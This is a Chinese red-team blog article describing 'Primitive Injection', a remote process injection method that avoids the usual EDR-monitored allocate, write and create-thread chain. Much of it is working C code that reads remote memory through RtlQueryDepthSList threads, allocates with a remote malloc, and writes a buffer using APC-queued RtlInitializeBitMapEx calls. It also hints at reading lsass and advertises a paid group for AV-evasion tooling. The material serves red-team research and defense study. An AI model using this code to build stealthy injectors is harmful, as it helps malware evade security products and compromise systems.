> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk1NzM5MTI2Mg==&mid=2247484892&idx=1&sn=b97c48f14b44444c9e2a8d98d658b620

#  避免注入链：Primitive Injection  
半只红队  半只红队   2025-06-30 06:22  
  
在远程进程注入中，EDR肯定会监视这经典的三个迹象：  
- 给进程分配新的内存：VirtualAllocEx  
  
- 修改此进程的内存：WriteProcessMemory、VirtualProtectEx  
  
- 执行：CreateRemoteThread  
  
除了这三个迹象，OpenProcess访问进程的访问权限描述符（dwDesiredAccess）也是检测检测对象，在上述基本的远程注入方法中，**PROCESS_VM_OPERATION、PROCESS_VM_WRITE、PROCESS_CREATE_THREAD**三种访问权限符是必须的。在上一篇分享的文章中分享、总结了Friend&Security的文章《CONTEXT-Only Injection》，这种方法使用的描述符仅PROCESS_CREATE_THREAD，并且分配与写入也是在目标进程中完成，避免了分配、写入、起线程的特征。当然，也仅绕过这个基本的注入链路，但我很喜欢它的**分析过程**。  
  
这篇文章我们就来分享一下另一种思路（由研究员trickster0去年在RedTread展示），也是避免这个链路，OpenProcess的访问权限，看起来并没有什么区别，但里面的思路，如获取堆地址的操作，分配写入、特殊函数等等，让我觉得很值得学习一下。（在阅读这篇文章之前，建议也看看公众号中上一篇文章《避免注入链：CONTEXT-Only》，因为我会在这里会比较他们的做法。）  
## Get Remote Heap Address  
  
说到注入嘛，离不开分配一块内存，问题就来了仅仅只有PROCESS_CREATE_THREAD权限如何做到？上一篇文章使用的是针对线程Set Context的方式，通过这种方式去执行VirtualAlloc，lpAddress是我们指定的，所以分配RWX就直接使用了。  
  
而本文介绍的思路中，使用的是malloc函数，这个函数仅接受一个参数，所以NtCreateThreadEx就直接就分配了，那如何获取分配的内存在哪呢？来看看malloc做啥的，这个函数内部会根据进程的堆基质自动在内存中分配一个空间，所以这个空间是在堆中，堆的基址我们也可以获取，通过PROCESS_QUERY_LIMITED_INFORMATION访问权限下读取目标进程的PEB结构中PebBaseAddress就可以知道。  

```
ULONG_PTR GetRemotePEBAddress() {
 PROCESS_BASIC_INFORMATION pInfo = { 0 };
 DWORD retLength = 0;
 DWORD status = NtApi.pfnNtQueryInformationProcess(hProc, ProcessBasicInformation, &pInfo, sizeof(PROCESS_BASIC_INFORMATION), &retLength);
 return (ULONG_PTR)pInfo.PebBaseAddress;
}

```

  
获取了PEB指针，现在需要去读取PebBaseAddress地址中的值，没有PROCESS_VM_READ权限就要考虑其他方式，这里用到函数GetExitCodeThread、RtlQueryDepthSList，第一个接受线程的返回值，但是它只会返回4个字节的EAX，在堆中我们最少需要6个字节。而第二个函数则是一个读取的操作，查看它的代码，还是挺舒服的嗯嗯。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq5ZhQSlicnuBcr8sZ1USu2HFmF5PhnyjYe1RTaUKibeCNagPhNPPwC9IWicds6g5ibiaI1jwWgAqeib8SVw/640?wx_fmt=png&from=appmsg "")  
  
所以现在的操作即迭代一下就可以读取到目标进程的内存地址了。（读lsass可以不？。。。）  

```
ULONG_PTR ReadRemotePEBAddress(HANDLE hProc, LPVOID pPebOffset, int sizeofVal) {
unsignedchar* readBytes = (unsignedchar*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeofVal);
 DWORD dwDataLength = sizeofVal;
for (DWORD i = 0; i < dwDataLength; i = i + 2)
 {
  HANDLE hThread = NULL;
  NtApi.pfnNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, NtApi.pfnRtlQueryDepthSList, (ULONG_PTR*)((BYTE*)pPebOffset + i), FALSE, 0, 0, 0, NULL);
  DWORD ExitCode = 0;
  NtApi.pfnNtWaitForSingleObject(hThread, FALSE, NULL);
  GetExitCodeThread(hThread, &ExitCode);

if (dwDataLength - i == 1)
   memcpy((char*)readBytes + i, (constvoid*)&ExitCode, 1);
else
   memcpy((char*)readBytes + i, (constvoid*)&ExitCode, 2);
 }
return (ULONG_PTR)readBytes;
}

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq5ZhQSlicnuBcr8sZ1USu2HFafTMvE9DI1hic5mE6ibF6iaicrZPibLXJrCm7fqLabcsFNfQgg1vqS74Bvw/640?wx_fmt=png&from=appmsg "")  
  
由于malloc是在进程的堆基址中分配，所以我可以获取分配地址的最后四个字节，在它们之间进行AND计算，最终获取到分配的地址：  

```
ULONG_PTR RemoteAllocation(HANDLE hProc, LPVOID pHeapBaseAddr, int sizeofVal) {
 ULONG_PTR pfnMalloc = (ULONG_PTR)GetProcAddress(LoadLibraryA(&#34;msvcrt.dll&#34;), &#34;malloc&#34;);
 HANDLE hThread = NULL;
 NtApi.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (PVOID)pfnMalloc, (PVOID)sizeofVal, FALSE, 0, 0, 0, NULL);
 NtApi.pfnNtWaitForSingleObject(hThread, FALSE, NULL);
 DWORD ExitCode = 0;
 GetExitCodeThread(hThread, &ExitCode);
 DWORD64 heapAllocation = (0xFFFFFFFF00000000 & (INT64)pHeapBaseAddr) + ExitCode;
 return (ULONG_PTR)heapAllocation;
}

```

## Write to Target Process  
  
目前可做到远程读取和分配了，剩下就是写入，在CONTEXT-Only的方式中，使用的是GetThreadContext、SetThreadContext方式对执行流进行操作，并通过RtlFillMemory将字节一个个写入。而不用这种方法的思路就是通过NtQueueApcThread操作，因为它最多支持三个参数，正好可以给RtlFillMemory用。  
  
但是APC队列会非常多，多到直接崩溃...  
  
所以有了另一个函数：RtlInitializeBitMapEx，这个函数底层的功能就是写入的操作（虽然它的作用不是用来WriteProcessMemory的），下面的代码也很干净。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq5ZhQSlicnuBcr8sZ1USu2HFcmQ9Zm51ia7oQk6dKl6xoiamLG4CgguP044ZibfCuibibicnLOIzcQia67xFQ/640?wx_fmt=png&from=appmsg "")  
  
它接受三个参数：第一个参数是目标内存地址，即我们希望写入数据的地址；第二个参数是目标地址的偏移量，表示在目标地址基础上写入的额外8字节；第三个参数是初始8字节数据，即要写入目标地址的首个数据块。这个也是三个参数的，所以可以通过循环调用NtQueueApcThread，可以在远程进程中写入数据，这比RtlFillMemory效率高了16倍。  

```
VOID WriteRemoteMemory(HANDLE hProc, LPVOID heapAllocation, SIZE_T sizeofVal, unsigned char* buffer, HMODULE module) {
 LPVOID RtlFillMemory = GetProcAddress(module, &#34;RtlFillMemory&#34;);
 LPVOID RtlExitUserThread = GetProcAddress(module, &#34;RtlExitUserThread&#34;);
 LPVOID RtlInitializeBitMapEx = GetProcAddress(module, &#34;RtlInitializeBitMapEx&#34;);

 HANDLE hThread = NULL;
 NtApi.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, RtlExitUserThread, (PVOID)0x00000000, TRUE, 0, 0, 0, NULL);
int alignmentCheck = sizeofVal % 16;
int offsetMax = sizeofVal - alignmentCheck;
int firCounter = 0;
int eightCounter = 0;
int secCounter = 0;
int mod = 0;

if (sizeofVal >= 16) {
for (firCounter = 0; firCounter < offsetMax - 1; firCounter = firCounter + 16) {
   char* heapWriter = (char*)heapAllocation + firCounter;
   NtApi.pfnNtQueueApcThread(hThread, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, (PVOID) * (ULONG_PTR*)((char*)buffer + firCounter + 8), (PVOID) * (ULONG_PTR*)((char*)buffer + firCounter));
  }
 }

if (alignmentCheck >= 8) {
for (eightCounter = firCounter; (eightCounter + 8) < (firCounter + alignmentCheck - 1); eightCounter = eightCounter + 8) {
   char* heapWriter = (char*)heapAllocation + eightCounter;
   NtApi.pfnNtQueueApcThread(hThread, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, NULL, (PVOID) * (ULONG_PTR*)((char*)buffer + eightCounter));
  }
  alignmentCheck -= 8;
 }

if (alignmentCheck != 0 && alignmentCheck < 8) {

if ((firCounter != 0 && eightCounter != 0) || (firCounter != 0 && eightCounter != 0)) {
   secCounter = eightCounter;
   mod = eightCounter;
  }
elseif (firCounter != 0 && eightCounter == 0) {
   secCounter = firCounter;
   mod = firCounter;
  }

for (; secCounter < (mod + alignmentCheck); secCounter++) {
   char* heapWriter = (char*)heapAllocation + secCounter;
   NtApi.pfnNtQueueApcThread(hThread, (PKNORMAL_ROUTINE)RtlFillMemory, (PVOID)heapWriter, (PVOID)1, (PVOID)buffer[secCounter]);
  }
 }

 NtApi.pfnNtResumeThread(hThread, NULL);
 NtApi.pfnNtWaitForSingleObject(hThread, FALSE, NULL);
return;
}

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq5ZhQSlicnuBcr8sZ1USu2HFVibIhqMqSW1MucVFTibaYKXsGdvxLBf1y8ibH5XYooZCJuzbnkNELHuAQ/640?wx_fmt=png&from=appmsg "")  
## The End  
  
这种思路倒是可以和上篇文章CONTEXT-Only结合一下，或许减少了很多了线程创建。或者Dirty Vanity也可以，下面给出两篇文章的链接。这个方法虽然它提供了很好的分配空间、与读取远程内存的思路，但是它并不能直接起远程线程执行，还是需要去寻求其他的方式去VirtualAlloc等，原作者的方式有种Foliage的味道，咱们就聊到这里，就不展开了。  
  
Dirty Vanity：https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass  
  
CONTEXT-Only：https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/  
### 圈子介绍  
### 圈子内部致力于红蓝对抗，武器免杀与二开，不定期分享前沿技术文章，经验总结，学习笔记以及自研工具与插件，进圈联系~  
### 圈子已满200余人，目前价格199，学生优惠30  
### 后续升价  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq6O9ceL4eETRFrWG9MAbicK1noOrz1pGynbCudIVyPOw6x4p6osZ9RckIWjia9PdPem8vENHricdbRsQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq4kT2c3qISNJSRoRmK9NhjDKHMT0m5F0CkGGZdxLcEXYVlEwGNJ7HnIPc44qc6gf9fPuuVqiadVKZQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
